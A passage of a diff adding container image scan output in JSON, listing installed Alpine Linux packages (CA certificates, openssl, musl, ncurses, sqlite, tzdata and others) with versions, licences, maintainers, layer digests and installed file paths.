+            "usr/share/ca-certificates/mozilla/Buypass_Class_3_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/CA_Disig_Root_R2.crt",
+            "usr/share/ca-certificates/mozilla/CFCA_EV_ROOT.crt",
+            "usr/share/ca-certificates/mozilla/COMODO_ECC_Certification_Authority.crt",
+            "usr/share/ca-certificates/mozilla/COMODO_RSA_Certification_Authority.crt",
+            "usr/share/ca-certificates/mozilla/Certainly_Root_E1.crt",
+            "usr/share/ca-certificates/mozilla/Certainly_Root_R1.crt",
+            "usr/share/ca-certificates/mozilla/Certigna_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/Certum_EC-384_CA.crt",
+            "usr/share/ca-certificates/mozilla/Certum_Trusted_Network_CA.crt",
+            "usr/share/ca-certificates/mozilla/Certum_Trusted_Network_CA_2.crt",
+            "usr/share/ca-certificates/mozilla/Certum_Trusted_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/D-TRUST_BR_Root_CA_1_2020.crt",
+            "usr/share/ca-certificates/mozilla/D-TRUST_BR_Root_CA_2_2023.crt",
+            "usr/share/ca-certificates/mozilla/D-TRUST_EV_Root_CA_1_2020.crt",
+            "usr/share/ca-certificates/mozilla/D-TRUST_EV_Root_CA_2_2023.crt",
+            "usr/share/ca-certificates/mozilla/D-TRUST_Root_Class_3_CA_2_2009.crt",
+            "usr/share/ca-certificates/mozilla/D-TRUST_Root_Class_3_CA_2_EV_2009.crt",
+            "usr/share/ca-certificates/mozilla/DigiCert_Assured_ID_Root_G2.crt",
+            "usr/share/ca-certificates/mozilla/DigiCert_Assured_ID_Root_G3.crt",
+            "usr/share/ca-certificates/mozilla/DigiCert_Global_Root_G2.crt",
+            "usr/share/ca-certificates/mozilla/DigiCert_Global_Root_G3.crt",
+            "usr/share/ca-certificates/mozilla/DigiCert_TLS_ECC_P384_Root_G5.crt",
+            "usr/share/ca-certificates/mozilla/DigiCert_TLS_RSA4096_Root_G5.crt",
+            "usr/share/ca-certificates/mozilla/DigiCert_Trusted_Root_G4.crt",
+            "usr/share/ca-certificates/mozilla/GDCA_TrustAUTH_R5_ROOT.crt",
+            "usr/share/ca-certificates/mozilla/GTS_Root_R1.crt",
+            "usr/share/ca-certificates/mozilla/GTS_Root_R3.crt",
+            "usr/share/ca-certificates/mozilla/GTS_Root_R4.crt",
+            "usr/share/ca-certificates/mozilla/GlobalSign_ECC_Root_CA_-_R4.crt",
+            "usr/share/ca-certificates/mozilla/GlobalSign_ECC_Root_CA_-_R5.crt",
+            "usr/share/ca-certificates/mozilla/GlobalSign_Root_CA_-_R3.crt",
+            "usr/share/ca-certificates/mozilla/GlobalSign_Root_CA_-_R6.crt",
+            "usr/share/ca-certificates/mozilla/GlobalSign_Root_E46.crt",
+            "usr/share/ca-certificates/mozilla/GlobalSign_Root_R46.crt",
+            "usr/share/ca-certificates/mozilla/Go_Daddy_Root_Certificate_Authority_-_G2.crt",
+            "usr/share/ca-certificates/mozilla/HARICA_TLS_ECC_Root_CA_2021.crt",
+            "usr/share/ca-certificates/mozilla/HARICA_TLS_RSA_Root_CA_2021.crt",
+            "usr/share/ca-certificates/mozilla/Hellenic_Academic_and_Research_Institutions_ECC_RootCA_2015.crt",
+            "usr/share/ca-certificates/mozilla/Hellenic_Academic_and_Research_Institutions_RootCA_2015.crt",
+            "usr/share/ca-certificates/mozilla/HiPKI_Root_CA_-_G1.crt",
+            "usr/share/ca-certificates/mozilla/Hongkong_Post_Root_CA_3.crt",
+            "usr/share/ca-certificates/mozilla/ISRG_Root_X1.crt",
+            "usr/share/ca-certificates/mozilla/ISRG_Root_X2.crt",
+            "usr/share/ca-certificates/mozilla/IdenTrust_Commercial_Root_CA_1.crt",
+            "usr/share/ca-certificates/mozilla/IdenTrust_Public_Sector_Root_CA_1.crt",
+            "usr/share/ca-certificates/mozilla/Izenpe.com.crt",
+            "usr/share/ca-certificates/mozilla/Microsec_e-Szigno_Root_CA_2009.crt",
+            "usr/share/ca-certificates/mozilla/Microsoft_ECC_Root_Certificate_Authority_2017.crt",
+            "usr/share/ca-certificates/mozilla/Microsoft_RSA_Root_Certificate_Authority_2017.crt",
+            "usr/share/ca-certificates/mozilla/NAVER_Global_Root_Certification_Authority.crt",
+            "usr/share/ca-certificates/mozilla/NetLock_Arany_=Class_Gold=_Főtanúsítvány.crt",
+            "usr/share/ca-certificates/mozilla/OISTE_Server_Root_ECC_G1.crt",
+            "usr/share/ca-certificates/mozilla/OISTE_Server_Root_RSA_G1.crt",
+            "usr/share/ca-certificates/mozilla/OISTE_WISeKey_Global_Root_GB_CA.crt",
+            "usr/share/ca-certificates/mozilla/OISTE_WISeKey_Global_Root_GC_CA.crt",
+            "usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_1_G3.crt",
+            "usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_2_G3.crt",
+            "usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_3_G3.crt",
+            "usr/share/ca-certificates/mozilla/SECOM_TLS_ECC_Root_CA_2024.crt",
+            "usr/share/ca-certificates/mozilla/SECOM_TLS_RSA_Root_CA_2024.crt",
+            "usr/share/ca-certificates/mozilla/SSL.com_EV_Root_Certification_Authority_ECC.crt",
+            "usr/share/ca-certificates/mozilla/SSL.com_EV_Root_Certification_Authority_RSA_R2.crt",
+            "usr/share/ca-certificates/mozilla/SSL.com_Root_Certification_Authority_ECC.crt",
+            "usr/share/ca-certificates/mozilla/SSL.com_Root_Certification_Authority_RSA.crt",
+            "usr/share/ca-certificates/mozilla/SSL.com_TLS_ECC_Root_CA_2022.crt",
+            "usr/share/ca-certificates/mozilla/SSL.com_TLS_RSA_Root_CA_2022.crt",
+            "usr/share/ca-certificates/mozilla/SZAFIR_ROOT_CA2.crt",
+            "usr/share/ca-certificates/mozilla/Sectigo_Public_Server_Authentication_Root_E46.crt",
+            "usr/share/ca-certificates/mozilla/Sectigo_Public_Server_Authentication_Root_R46.crt",
+            "usr/share/ca-certificates/mozilla/SecureSign_Root_CA14.crt",
+            "usr/share/ca-certificates/mozilla/SecureSign_Root_CA15.crt",
+            "usr/share/ca-certificates/mozilla/Security_Communication_ECC_RootCA1.crt",
+            "usr/share/ca-certificates/mozilla/Security_Communication_RootCA2.crt",
+            "usr/share/ca-certificates/mozilla/Starfield_Root_Certificate_Authority_-_G2.crt",
+            "usr/share/ca-certificates/mozilla/Starfield_Services_Root_Certificate_Authority_-_G2.crt",
+            "usr/share/ca-certificates/mozilla/SwissSign_RSA_TLS_Root_CA_2022_-_1.crt",
+            "usr/share/ca-certificates/mozilla/T-TeleSec_GlobalRoot_Class_2.crt",
+            "usr/share/ca-certificates/mozilla/T-TeleSec_GlobalRoot_Class_3.crt",
+            "usr/share/ca-certificates/mozilla/TUBITAK_Kamu_SM_SSL_Kok_Sertifikasi_-_Surum_1.crt",
+            "usr/share/ca-certificates/mozilla/TWCA_CYBER_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/TWCA_Global_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/TWCA_Root_Certification_Authority.crt",
+            "usr/share/ca-certificates/mozilla/Telekom_Security_TLS_ECC_Root_2020.crt",
+            "usr/share/ca-certificates/mozilla/Telekom_Security_TLS_RSA_Root_2023.crt",
+            "usr/share/ca-certificates/mozilla/Telia_EC_TLS_Root_CA_v3.crt",
+            "usr/share/ca-certificates/mozilla/Telia_RSA_TLS_Root_CA_v3.crt",
+            "usr/share/ca-certificates/mozilla/Telia_Root_CA_v2.crt",
+            "usr/share/ca-certificates/mozilla/TrustAsia_Global_Root_CA_G3.crt",
+            "usr/share/ca-certificates/mozilla/TrustAsia_Global_Root_CA_G4.crt",
+            "usr/share/ca-certificates/mozilla/TrustAsia_TLS_ECC_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/TrustAsia_TLS_RSA_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/TunTrust_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/UCA_Extended_Validation_Root.crt",
+            "usr/share/ca-certificates/mozilla/UCA_Global_G2_Root.crt",
+            "usr/share/ca-certificates/mozilla/USERTrust_ECC_Certification_Authority.crt",
+            "usr/share/ca-certificates/mozilla/USERTrust_RSA_Certification_Authority.crt",
+            "usr/share/ca-certificates/mozilla/certSIGN_Root_CA_G2.crt",
+            "usr/share/ca-certificates/mozilla/e-Szigno_Root_CA_2017.crt",
+            "usr/share/ca-certificates/mozilla/e-Szigno_TLS_Root_CA_2023.crt",
+            "usr/share/ca-certificates/mozilla/emSign_Root_CA_-_G1.crt",
+            "usr/share/ca-certificates/mozilla/vTrus_ECC_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/vTrus_Root_CA.crt"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "ca-certificates-bundle@20261020-r0",
+          "Name": "ca-certificates-bundle",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/ca-certificates-bundle@20261020-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "a70608abcaf07d7a"
+          },
+          "Version": "20261020-r0",
+          "Arch": "x86_64",
+          "SrcName": "ca-certificates",
+          "SrcVersion": "20261020-r0",
+          "Licenses": [
+            "MPL-2.0",
+            "MIT"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:7c6e635f86aafb46cb3b015d8505b3a5f61156bd",
+          "InstalledFiles": [
+            "etc/ssl/cert.pem",
+            "etc/ssl/certs/ca-certificates.crt",
+            "etc/ssl1.1/cert.pem",
+            "etc/ssl1.1/certs"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "gdbm@1.26-r0",
+          "Name": "gdbm",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/gdbm@1.26-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "450dd007c22731c1"
+          },
+          "Version": "1.26-r0",
+          "Arch": "x86_64",
+          "SrcName": "gdbm",
+          "SrcVersion": "1.26-r0",
+          "Licenses": [
+            "GPL-3.0-or-later"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:619493d8124fe49a8ee1d8f7a1372cf7e3977337",
+          "InstalledFiles": [
+            "usr/lib/libgdbm.so.6",
+            "usr/lib/libgdbm.so.6.0.0",
+            "usr/lib/libgdbm_compat.so.4",
+            "usr/lib/libgdbm_compat.so.4.0.0"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "libapk@3.0.9-r0",
+          "Name": "libapk",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/libapk@3.0.9-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "2a1befcdcd392822"
+          },
+          "Version": "3.0.9-r0",
+          "Arch": "x86_64",
+          "SrcName": "apk-tools",
+          "SrcVersion": "3.0.9-r0",
+          "Licenses": [
+            "GPL-2.0-only"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "libcrypto3@3.5.9-r0",
+            "libssl3@3.5.9-r0",
+            "musl@1.2.6-r3",
+            "zlib@1.3.2-r1"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:a94f4d7f67ee47ba5c5185864af1d4b16113c598",
+          "InstalledFiles": [
+            "usr/lib/libapk.so.3.0.0"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "libbz2@1.0.8-r6",
+          "Name": "libbz2",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/libbz2@1.0.8-r6?arch=x86_64\u0026distro=3.24.4",
+            "UID": "58cbb729cba7750a"
+          },
+          "Version": "1.0.8-r6",
+          "Arch": "x86_64",
+          "SrcName": "bzip2",
+          "SrcVersion": "1.0.8-r6",
+          "Licenses": [
+            "bzip-2-1.0.6"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:08566ba5c7af97c25474be8b24e8b48f0116b67d",
+          "InstalledFiles": [
+            "usr/lib/libbz2.so.1",
+            "usr/lib/libbz2.so.1.0.8"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "libcrypto3@3.5.9-r0",
+          "Name": "libcrypto3",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/libcrypto3@3.5.9-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "3de134b31d66634f"
+          },
+          "Version": "3.5.9-r0",
+          "Arch": "x86_64",
+          "SrcName": "openssl",
+          "SrcVersion": "3.5.9-r0",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:1c0dee9734cf22fc97cdd181913bbd710e6dfb08",
+          "InstalledFiles": [
+            "etc/ssl/ct_log_list.cnf",
+            "etc/ssl/ct_log_list.cnf.dist",
+            "etc/ssl/openssl.cnf",
+            "etc/ssl/openssl.cnf.dist",
+            "usr/lib/libcrypto.so.3",
+            "usr/lib/engines-3/afalg.so",
+            "usr/lib/engines-3/capi.so",
+            "usr/lib/engines-3/loader_attic.so",
+            "usr/lib/engines-3/padlock.so",
+            "usr/lib/ossl-modules/legacy.so"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "libffi@3.5.2-r1",
+          "Name": "libffi",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/libffi@3.5.2-r1?arch=x86_64\u0026distro=3.24.4",
+            "UID": "b9077badab89665d"
+          },
+          "Version": "3.5.2-r1",
+          "Arch": "x86_64",
+          "SrcName": "libffi",
+          "SrcVersion": "3.5.2-r1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:2f7b261f7fcecc4eebd8b330e7f6fb80713bfe3a",
+          "InstalledFiles": [
+            "usr/lib/libffi.so.8",
+            "usr/lib/libffi.so.8.2.0"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "libncursesw@6.6_p20260516-r0",
+          "Name": "libncursesw",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/libncursesw@6.6_p20260516-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "3447c1e30d67c496"
+          },
+          "Version": "6.6_p20260516-r0",
+          "Arch": "x86_64",
+          "SrcName": "ncurses",
+          "SrcVersion": "6.6_p20260516-r0",
+          "Licenses": [
+            "X-11"
+          ],
+          "Maintainer": "Milan P. Stanić \u003cmps@arvanta.net\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3",
+            "ncurses-terminfo-base@6.6_p20260516-r0"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:9f318e6e324d6827274829194cf6ac6afbaded12",
+          "InstalledFiles": [
+            "usr/lib/libncursesw.so.6",
+            "usr/lib/libncursesw.so.6.6"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "libpanelw@6.6_p20260516-r0",
+          "Name": "libpanelw",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/libpanelw@6.6_p20260516-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "36f0c007c828b022"
+          },
+          "Version": "6.6_p20260516-r0",
+          "Arch": "x86_64",
+          "SrcName": "ncurses",
+          "SrcVersion": "6.6_p20260516-r0",
+          "Licenses": [
+            "X-11"
+          ],
+          "Maintainer": "Milan P. Stanić \u003cmps@arvanta.net\u003e",
+          "DependsOn": [
+            "libncursesw@6.6_p20260516-r0",
+            "musl@1.2.6-r3",
+            "ncurses-terminfo-base@6.6_p20260516-r0"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:149bdc434232ed11fc5bb975ba519a07154a6f56",
+          "InstalledFiles": [
+            "usr/lib/libpanelw.so.6",
+            "usr/lib/libpanelw.so.6.6"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "libssl3@3.5.9-r0",
+          "Name": "libssl3",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/libssl3@3.5.9-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "c5a60e84169f3215"
+          },
+          "Version": "3.5.9-r0",
+          "Arch": "x86_64",
+          "SrcName": "openssl",
+          "SrcVersion": "3.5.9-r0",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "libcrypto3@3.5.9-r0",
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:20c4c90ea9d20a9dd3a04deadf2c6c4f64233643",
+          "InstalledFiles": [
+            "usr/lib/libssl.so.3"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "libuuid@2.42.3-r1",
+          "Name": "libuuid",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/libuuid@2.42.3-r1?arch=x86_64\u0026distro=3.24.4",
+            "UID": "567c914549fcb883"
+          },
+          "Version": "2.42.3-r1",
+          "Arch": "x86_64",
+          "SrcName": "util-linux",
+          "SrcVersion": "2.42.3-r1",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:8f041ef637ad75f381cc0c034f2afbbb0303264e",
+          "InstalledFiles": [
+            "usr/lib/libuuid.so.1",
+            "usr/lib/libuuid.so.1.3.0"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "musl@1.2.6-r3",
+          "Name": "musl",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/musl@1.2.6-r3?arch=x86_64\u0026distro=3.24.4",
+            "UID": "43d4b05c5472a58c"
+          },
+          "Version": "1.2.6-r3",
+          "Arch": "x86_64",
+          "SrcName": "musl",
+          "SrcVersion": "1.2.6-r3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:770e8304d958dced98d76997df9e8fa1db5ca32f",
+          "InstalledFiles": [
+            "lib/ld-musl-x86_64.so.1",
+            "lib/libc.musl-x86_64.so.1"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "musl-utils@1.2.6-r3",
+          "Name": "musl-utils",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/musl-utils@1.2.6-r3?arch=x86_64\u0026distro=3.24.4",
+            "UID": "1bd73db44d355699"
+          },
+          "Version": "1.2.6-r3",
+          "Arch": "x86_64",
+          "SrcName": "musl",
+          "SrcVersion": "1.2.6-r3",
+          "Licenses": [
+            "MIT",
+            "BSD-2-Clause",
+            "GPL-2.0-or-later"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3",
+            "scanelf@1.3.9-r1"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:51372daafb234646960eca4d7a13f706324f24d6",
+          "InstalledFiles": [
+            "sbin/ldconfig",
+            "usr/bin/getconf",
+            "usr/bin/getent",
+            "usr/bin/iconv",
+            "usr/bin/ldd"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "ncurses-terminfo-base@6.6_p20260516-r0",
+          "Name": "ncurses-terminfo-base",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/ncurses-terminfo-base@6.6_p20260516-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "e7fac5c6a6e9ae8"
+          },
+          "Version": "6.6_p20260516-r0",
+          "Arch": "x86_64",
+          "SrcName": "ncurses",
+          "SrcVersion": "6.6_p20260516-r0",
+          "Licenses": [
+            "X-11"
+          ],
+          "Maintainer": "Milan P. Stanić \u003cmps@arvanta.net\u003e",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:9d551d828e9c8ee52c5801c1d6046828ebf15752",
+          "InstalledFiles": [
+            "etc/terminfo/a/alacritty",
+            "etc/terminfo/a/ansi",
+            "etc/terminfo/d/dumb",
+            "etc/terminfo/g/gnome",
+            "etc/terminfo/g/gnome-256color",
+            "etc/terminfo/k/konsole",
+            "etc/terminfo/k/konsole-256color",
+            "etc/terminfo/k/konsole-linux",
+            "etc/terminfo/l/linux",
+            "etc/terminfo/p/putty",
+            "etc/terminfo/p/putty-256color",
+            "etc/terminfo/r/rxvt",
+            "etc/terminfo/r/rxvt-256color",
+            "etc/terminfo/s/screen",
+            "etc/terminfo/s/screen-256color",
+            "etc/terminfo/s/st-0.6",
+            "etc/terminfo/s/st-0.7",
+            "etc/terminfo/s/st-0.8",
+            "etc/terminfo/s/st-0.8.5",
+            "etc/terminfo/s/st-16color",
+            "etc/terminfo/s/st-256color",
+            "etc/terminfo/s/st-direct",
+            "etc/terminfo/s/sun",
+            "etc/terminfo/t/terminator",
+            "etc/terminfo/t/terminology",
+            "etc/terminfo/t/terminology-0.6.1",
+            "etc/terminfo/t/terminology-1.0.0",
+            "etc/terminfo/t/terminology-1.8.1",
+            "etc/terminfo/t/tmux",
+            "etc/terminfo/t/tmux-256color",
+            "etc/terminfo/v/vt100",
+            "etc/terminfo/v/vt102",
+            "etc/terminfo/v/vt200",
+            "etc/terminfo/v/vt220",
+            "etc/terminfo/v/vt52",
+            "etc/terminfo/v/vte",
+            "etc/terminfo/v/vte-256color",
+            "etc/terminfo/x/xterm",
+            "etc/terminfo/x/xterm-256color",
+            "etc/terminfo/x/xterm-color",
+            "etc/terminfo/x/xterm-xfree86"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "readline@8.3.3-r1",
+          "Name": "readline",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/readline@8.3.3-r1?arch=x86_64\u0026distro=3.24.4",
+            "UID": "2c597924503d762b"
+          },
+          "Version": "8.3.3-r1",
+          "Arch": "x86_64",
+          "SrcName": "readline",
+          "SrcVersion": "8.3.3-r1",
+          "Licenses": [
+            "GPL-3.0-or-later"
+          ],
+          "Maintainer": "qaqland \u003cqaq@qaq.land\u003e",
+          "DependsOn": [
+            "libncursesw@6.6_p20260516-r0",
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:945b16e378bc00e44d89d4de8124bba7647fdf4d",
+          "InstalledFiles": [
+            "etc/inputrc",
+            "usr/lib/libreadline.so.8",
+            "usr/lib/libreadline.so.8.3"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "scanelf@1.3.9-r1",
+          "Name": "scanelf",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/scanelf@1.3.9-r1?arch=x86_64\u0026distro=3.24.4",
+            "UID": "f832b0b0d6c76e18"
+          },
+          "Version": "1.3.9-r1",
+          "Arch": "x86_64",
+          "SrcName": "pax-utils",
+          "SrcVersion": "1.3.9-r1",
+          "Licenses": [
+            "GPL-2.0-only"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:013f903d0ba219673aebbdd04f74bb5ed82b01f0",
+          "InstalledFiles": [
+            "usr/bin/scanelf"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "sqlite-libs@3.53.4-r0",
+          "Name": "sqlite-libs",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/sqlite-libs@3.53.4-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "705d37789849fc09"
+          },
+          "Version": "3.53.4-r0",
+          "Arch": "x86_64",
+          "SrcName": "sqlite",
+          "SrcVersion": "3.53.4-r0",
+          "Licenses": [
+            "blessing"
+          ],
+          "Maintainer": "Jingyun Hua \u003chuajingyun@loongson.cn\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:f7630ceb37c232b6609861aeab6cdb9cd120e6fa",
+          "InstalledFiles": [
+            "usr/lib/libsqlite3.so.0",
+            "usr/lib/libsqlite3.so.3.53.4"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "ssl_client@1.37.0-r31",
+          "Name": "ssl_client",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/ssl_client@1.37.0-r31?arch=x86_64\u0026distro=3.24.4",
+            "UID": "3e7a1baa8bc3bfe0"
+          },
+          "Version": "1.37.0-r31",
+          "Arch": "x86_64",
+          "SrcName": "busybox",
+          "SrcVersion": "1.37.0-r31",
+          "Licenses": [
+            "GPL-2.0-only"
+          ],
+          "Maintainer": "Sören Tempel \u003csoeren+alpine@soeren-tempel.net\u003e",
+          "DependsOn": [
+            "libcrypto3@3.5.9-r0",
+            "libssl3@3.5.9-r0",
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:c220f4a5125a313af733e98def94132bb1e9d40d",
+          "InstalledFiles": [
+            "usr/bin/ssl_client"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "tzdata@2026f-r0",
+          "Name": "tzdata",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/tzdata@2026f-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "dfeab54a942e8811"
+          },
+          "Version": "2026f-r0",
+          "Arch": "x86_64",
+          "SrcName": "tzdata",
+          "SrcVersion": "2026f-r0",
+          "Licenses": [
+            "Public-Domain"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "Layer": {
+            "Digest": "sha256:ce6949f6b5329553c2f3fc626421da4f70d633cfddb6ad2227f3ac0b7205bd8f",
